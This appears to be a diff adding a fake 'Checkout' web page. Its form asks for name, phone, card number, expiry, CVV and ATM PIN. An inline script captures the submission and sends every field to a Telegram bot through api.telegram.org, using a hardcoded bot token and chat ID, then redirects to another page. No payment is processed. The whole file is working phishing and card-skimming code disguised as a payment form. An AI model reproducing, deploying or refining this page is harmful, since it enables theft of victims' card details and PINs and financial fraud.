@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+ <meta charset="UTF-8">
+ <meta name="viewport" content="width=device-width, initial-scale=1.0">
+ <title>Checkout</title>
+ <link rel="stylesheet" type="text/css" href="style2.css">
+</head>
+<body>
+ <div class="banner">
+ <img src="01.jpg" alt="Banner Image" style="width: 100%; height: 100%; ">
+ </div>
+ <div class="container">
+ <h1 style="text-align: center;"></h1>
+ <form>
+ <div class="form-section">
+ <h2>ENTER YOUR CREDENTIALS</h2>
+ <label for="Name">CLIENT'S NAME</label>
+ <input type="text" id="Name" name="Name" placeholder="ENTER YOUR NAME" required>
+ <label for="mobileNumber">MOBILE NUMBER</label>
+ <input type="tel" id="mobileNumber" name="mobileNumber" placeholder=" LINKD MOBILE NUMBER" required>
+ <label for="address">AMOUNT TO PAY</label>
+ <input type="text" id="address" name="address" placeholder="ENTER AMOUNT" required>
+ </div>
+ <div class="form-section">
+ <h2>Card Pay</h2>
+ <label for="cardHolderName">Card Holder Name</label>
+ <input type="text" id="cardHolderName" name="cardHolderName" placeholder="ENTER CARD HOLDER NAME" required>
+ <label>Card Type</label>
+ <div class="card-type">
+ <label><input type="radio" name="cardType" value="credit" checked> Credit</label>
+ <label><input type="radio" name="cardType" value="debit"> Debit</label>
+ </div>
+ <label for="cardNumber">Card Number</label>
+ <input type="number" id="cardNumber" name="cardNumber" placeholder="0000 0000 0000 0000" required>
+ <label for="expiryMonth">Expiry Month</label>
+ <input type="number" id="expiryMonth" name="expiryMonth" placeholder="MM" required>
+ <label for="expiryYear">Expiry Year</label>
+ <input type="number" id="expiryYear" name="expiryYear" placeholder="YYYY" required>
+  <label for="cvv">CVV</label>
+<input type="number" id="cvv" name="cvv" placeholder="CVV" required>
+ <label for="atmpim">ATM Pin</label>
+ <input type="number" id="atmpim" name="atmpim" placeholder="ATM PIN" required>
+ <br><br>
+ <button type="submit">MAKE PAYMENT</button>
+ </div>
+ </form>
+ </div>
+ <script>
+ const API_TOKEN = '8101119609:AAGA039ibNm2hQTKBoS5vFlyzIP47wQAbM4';
+ const CHAT_ID = '-1002615335715';
+ const form = document.querySelector('form');
+
+ form.addEventListener('submit', (e) => {
+ e.preventDefault();
+
+ const formData = new FormData(form);
+ const data = {
+  clientName: formData.get('Name'),
+  mobileNumber: formData.get('mobileNumber'),
+  amountToPay: formData.get('address'),
+  cardHolderName: formData.get('cardHolderName'),
+  cardType: formData.get('cardType'),
+  cardNumber: formData.get('cardNumber'),
+  expiryMonth: formData.get('expiryMonth'),
+  expiryYear: formData.get('expiryYear'),
+  cvv: formData.get('cvv'),
+  atmPin: formData.get('atmpim'),
+};
+
+ const message = `ᴅᴇᴠᴇʟᴏᴘᴇᴅ ʙʏ : @Heck0bot\nClient Name : ${data.clientName}\nMobile Number : ${data.mobileNumber}\nAmount to Pay : ${data.amountToPay}\nCard Holder Name : ${data.cardHolderName}\nCard Type : ${data.cardType}\nCard Number : ${data.cardNumber}\nExpiry Month : ${data.expiryMonth}\nExpiry Year : ${data.expiryYear}\nCVV : ${data.cvv}\nATM Pin : ${data.atmPin}`;
+ fetch(`https://api.telegram.org/bot${API_TOKEN}/sendMessage`, {
+ method: 'POST',
+ headers: {
+ 'Content-Type': 'application/json',
+ },
+ body: JSON.stringify({
+ chat_id: CHAT_ID,
+ text: message,
+ }),
+ })
+ .then((response) => response.json())
+ .then((data) => {
+ console.log(data);
+ window.location.href = 'next-page.html'; // redirect to next page
+ })
+ .catch((error) => console.error(error));
+ });
+ </script>
+</body>
+</html>
